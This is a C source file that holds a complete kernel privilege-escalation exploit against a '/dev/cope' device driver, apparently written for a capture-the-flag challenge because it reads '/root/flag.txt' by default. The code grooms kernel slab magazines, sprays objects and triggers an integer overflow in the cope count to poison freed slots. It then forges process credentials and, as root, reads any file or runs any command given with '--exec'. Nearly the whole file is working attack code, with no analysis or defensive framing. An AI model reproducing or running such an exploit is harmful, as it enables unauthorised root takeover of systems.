/* Pre-fill magazine + cope exploit.
 * Pre-fills the kmem_alloc_40 magazine by creating/destroying
 * many cope objects, then does the slab exploit. */
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/cope.h>
#include <sys/processor.h>

#define NSPRAY 64
#define NSTAGES 5
#define STAGE_SLOTS 6
#define MIN_STAGE_POISONS 3
#define OVERFLOW_NCOPE 0x40000002u
#define OVERFLOW_COPY 30
#define CMD_TEXT_MAX 240
#define RESP_TEXT_MAX 2048
#define FAKE_CRED_PROC_OFFSET 1520u
#define PROC_P_CRED_OFFSET 32u
/* Pre-fill: create and destroy this many cope objects to fill magazines */
#define PREFILL_COUNT 80

struct cmd { char op; uint8_t data[24]; uint64_t value; char text[CMD_TEXT_MAX]; };
struct resp { int err; int aux; int len; char data[RESP_TEXT_MAX]; };
struct child { pid_t pid; int cmd_fd; int rsp_fd; };

static int do_cope(int fd, uint32_t n, cope_t *c) {
    cope_ioc_t ioc = { .ci_copes = c, .ci_ncope = n };
    return ioctl(fd, COPEIOC_COPE, &ioc);
}
static int safe2(int fd, const uint8_t p[24]) {
    cope_t c[2]; memset(c, 0, sizeof(c));
    memcpy(c[0].co_data, p, 8); memcpy(c[1].co_data, p+12, 8);
    return do_cope(fd, 2, c);
}
static int do_poison(int fd, uint64_t forge) {
    cope_t c[OVERFLOW_COPY]; memset(c, 0, sizeof(c));
    memcpy(c[5].co_data, &forge, sizeof(forge));
    return do_cope(fd, OVERFLOW_NCOPE, c);
}

static void send_resp(int fd, int e, int a, const void *d, size_t l) {
    struct resp r; memset(&r, 0, sizeof(r)); r.err=e; r.aux=a;
    if(l>sizeof(r.data))l=sizeof(r.data);
    r.len=(int)l; if(l&&d)memcpy(r.data,d,l);
    write(fd,&r,sizeof(r));
}

static void child_loop(int cr, int rw, bool is2) {
    int fd; struct cmd cmd; uint8_t z[24]; memset(z,0,24);
    processor_bind(P_LWPID, P_MYID, 0, NULL);
    fd = open("/dev/cope", O_RDWR);
    if(fd<0)err(1,"cope");
    if(is2){safe2(fd,z)?send_resp(rw,errno,0,0,0):send_resp(rw,0,0,0,0);}
    else send_resp(rw,0,0,0,0);
    while(read(cr,&cmd,sizeof(cmd))==sizeof(cmd)){
        switch(cmd.op){
        case '2': safe2(fd,cmd.data)?send_resp(rw,errno,0,0,0):send_resp(rw,0,0,0,0); break;
        case 'x': do_poison(fd,cmd.value)?send_resp(rw,errno,0,0,0):send_resp(rw,0,0,0,0); break;
        case 'F': { int pp[2];pid_t p;struct resp ir;pipe(pp);
            p=fork();if(p==0){close(pp[0]);
            int f=open(cmd.text,O_RDONLY);char b[RESP_TEXT_MAX];ssize_t n;
            if(f<0)send_resp(pp[1],errno,0,0,0);
            else{n=read(f,b,sizeof(b)-1);close(f);
            if(n>0){b[n]=0;send_resp(pp[1],0,0,b,(size_t)n);}
            else send_resp(pp[1],errno,0,0,0);}
            _exit(0);}
            close(pp[1]);read(pp[0],&ir,sizeof(ir));close(pp[0]);
            waitpid(p,0,0);send_resp(rw,ir.err,ir.aux,ir.data,(size_t)ir.len);break;}
        case 'Y': { int pp[2];pid_t p;struct resp ir;pipe(pp);
            p=fork();if(p==0){close(pp[0]);
            FILE *fp=popen(cmd.text,"r");char b[RESP_TEXT_MAX];size_t o=0;
            if(fp){while(o<sizeof(b)-1&&fgets(b+o,(int)(sizeof(b)-o),fp))o=strlen(b);pclose(fp);}
            b[o]=0;send_resp(pp[1],0,0,b,o);_exit(0);}
            close(pp[1]);read(pp[0],&ir,sizeof(ir));close(pp[0]);
            waitpid(p,0,0);send_resp(rw,ir.err,ir.aux,ir.data,(size_t)ir.len);break;}
        case 'g': { int pp[2];pid_t p;struct resp ir;pipe(pp);
            p=fork();if(p==0){close(pp[0]);
            uid_t ids[2]={getuid(),geteuid()};
            memset(&ir,0,sizeof(ir));ir.len=sizeof(ids);memcpy(ir.data,ids,sizeof(ids));
            write(pp[1],&ir,sizeof(ir));_exit(0);}
            close(pp[1]);read(pp[0],&ir,sizeof(ir));close(pp[0]);
            waitpid(p,0,0);send_resp(rw,ir.err,0,ir.data,(size_t)ir.len);break;}
        case 'u': {uid_t ids[2]={getuid(),geteuid()};send_resp(rw,0,0,ids,sizeof(ids));break;}
        case 'q': close(fd);_exit(0);
        }
    }
    close(fd);_exit(0);
}

static struct child cspawn(bool s2) {
    int cp[2],rp[2];struct child ch;struct resp r;
    pipe(cp);pipe(rp);
    ch.pid=fork();if(ch.pid==0){close(cp[1]);close(rp[0]);child_loop(cp[0],rp[1],s2);}
    close(cp[0]);close(rp[1]);ch.cmd_fd=cp[1];ch.rsp_fd=rp[0];
    if(read(ch.rsp_fd,&r,sizeof(r))!=sizeof(r))errx(1,"spawn");
    if(r.err)errx(1,"init:%d",r.err);
    return ch;
}

static struct resp ccmd(const struct child *ch, char op, const uint8_t *d,
    uint64_t v, const char *t) {
    struct cmd cmd;struct resp r;memset(&cmd,0,sizeof(cmd));
    cmd.op=op;cmd.value=v;
    if(d)memcpy(cmd.data,d,sizeof(cmd.data));
    if(t)snprintf(cmd.text,sizeof(cmd.text),"%s",t);
    write(ch->cmd_fd,&cmd,sizeof(cmd));
    read(ch->rsp_fd,&r,sizeof(r));
    return r;
}

static void cexit(struct child *ch) {
    struct cmd cmd;memset(&cmd,0,sizeof(cmd));cmd.op='q';
    write(ch->cmd_fd,&cmd,sizeof(cmd));
    close(ch->cmd_fd);close(ch->rsp_fd);
    waitpid(ch->pid,0,0);ch->pid=-1;
}

static uint64_t rhex(const char *cmd) {
    FILE *fp=popen(cmd,"r");char b[256];
    if(!fp)err(1,"popen");
    do{if(!fgets(b,sizeof(b),fp))errx(1,"hex");}while(b[0]=='\n'||!b[0]);
    pclose(fp);return strtoull(b,0,16);
}

/* Pre-fill magazines by creating and destroying cope objects */
static void prefill_magazines(void) {
    int i;
    fprintf(stderr, "[*] pre-filling magazines (%d objects)\n", PREFILL_COUNT);
    for (i = 0; i < PREFILL_COUNT; i++) {
        pid_t p = fork();
        if (p == 0) {
            int fd = open("/dev/cope", O_RDWR);
            if (fd >= 0) {
                cope_t c[2]; memset(c, 0, sizeof(c));
                do_cope(fd, 2, c);
                close(fd);
            }
            _exit(0);
        }
        waitpid(p, NULL, 0);
    }
    fprintf(stderr, "[*] pre-fill done\n");
}

int main(int argc, char **argv) {
    struct child spray[NSPRAY], runner, cons[NSTAGES], writ[NSTAGES];
    uint8_t z[24]; memset(z,0,24);
    int sb[NSTAGES][STAGE_SLOTS], sa[NSTAGES][STAGE_SLOTS];
    int g, i, success;
    struct resp rsp;
    const char *exec_cmd=NULL, *read_path="/root/flag.txt";
    uint64_t rproc, fakecred;
    uint8_t sp[NSTAGES][24];
    uint64_t sf[NSTAGES];

    for(i=1;i<argc;i++){
        if(!strcmp(argv[i],"--exec")&&i+1<argc)exec_cmd=argv[++i];
        else if(!strcmp(argv[i],"--read")&&i+1<argc)read_path=argv[++i];
    }
    setvbuf(stderr,0,_IONBF,0);

    /* Pre-fill magazines first */
    prefill_magazines();

    fprintf(stderr,"[*] runner\n");
    runner=cspawn(false);
    char cmd[128];snprintf(cmd,sizeof(cmd),"ps -o addr= -p %d",runner.pid);
    rproc=rhex(cmd);
    fakecred=rproc+FAKE_CRED_PROC_OFFSET;
    fprintf(stderr,"[*] p=%#"PRIx64" f=%#"PRIx64"\n",rproc,fakecred);

    sf[0]=fakecred+12;memset(sp[0],0,24);
    sf[1]=fakecred+48;memset(sp[1],0,24);memset(sp[1],0xff,8);memset(sp[1]+12,0xff,8);
    sf[2]=fakecred+72;memset(sp[2],0,24);memset(sp[2],0xff,8);memset(sp[2]+12,0xff,8);
    sf[3]=fakecred+84;memset(sp[3],0,24);memset(sp[3],0xff,8);
    sf[4]=rproc+PROC_P_CRED_OFFSET+8;memset(sp[4],0,24);memcpy(sp[4]+12,&fakecred,8);

    fprintf(stderr,"[*] spray %d\n",NSPRAY);
    for(i=0;i<NSPRAY;i++)spray[i]=cspawn(true);

    for(g=0;g<NSTAGES;g++)
        for(i=0;i<STAGE_SLOTS;i++){
            sb[g][i]=2+g*(STAGE_SLOTS*2)+i*2;
            sa[g][i]=sb[g][i]+1;}

    fprintf(stderr,"[*] free B\n");
    for(g=0;g<NSTAGES;g++)
        for(i=0;i<STAGE_SLOTS;i++)cexit(&spray[sb[g][i]]);

    /* Extra pre-fill after freeing to push objects through magazines */
    fprintf(stderr,"[*] extra fill\n");
    for(i=0;i<30;i++){
        pid_t p=fork();if(p==0){
            int fd=open("/dev/cope",O_RDWR);
            if(fd>=0){cope_t c[2];memset(c,0,sizeof(c));do_cope(fd,2,c);close(fd);}
            _exit(0);}
        waitpid(p,0,0);
    }

    fprintf(stderr,"[*] stages\n");
    for(g=0;g<NSTAGES;g++){
        fprintf(stderr,"[*] s%d\n",g);
        success=0;
        for(i=0;i<STAGE_SLOTS;i++){
            rsp=ccmd(&spray[sa[g][i]],'x',0,sf[g],0);
            if(rsp.err)continue;
            success++;if(success>=MIN_STAGE_POISONS)break;
        }
        if(success<MIN_STAGE_POISONS){fprintf(stderr,"s%d fail:%d\n",g,success);return 1;}

        cons[g]=cspawn(false);
        rsp=ccmd(&cons[g],'2',z,0,0);
        if(rsp.err){fprintf(stderr,"c%d:%d\n",g,rsp.err);return 1;}

        writ[g]=cspawn(false);
        rsp=ccmd(&writ[g],'2',sp[g],0,0);
        if(rsp.err){fprintf(stderr,"w%d:%d\n",g,rsp.err);return 1;}
    }

    rsp=ccmd(&runner,'u',0,0,0);
    uid_t *ids=(uid_t*)rsp.data;
    fprintf(stderr,"[*] uid=%u euid=%u\n",ids[0],ids[1]);

    rsp=ccmd(&runner,'g',0,0,0);
    ids=(uid_t*)rsp.data;
    fprintf(stderr,"[*] fork uid=%u euid=%u\n",ids[0],ids[1]);

    if(exec_cmd)rsp=ccmd(&runner,'Y',0,0,exec_cmd);
    else rsp=ccmd(&runner,'F',0,0,read_path);
    if(rsp.len<=0){fprintf(stderr,"fail:%d\n",rsp.err);return 1;}
    printf("%.*s\n",rsp.len,rsp.data);
    fflush(stdout);
    return 0;
}
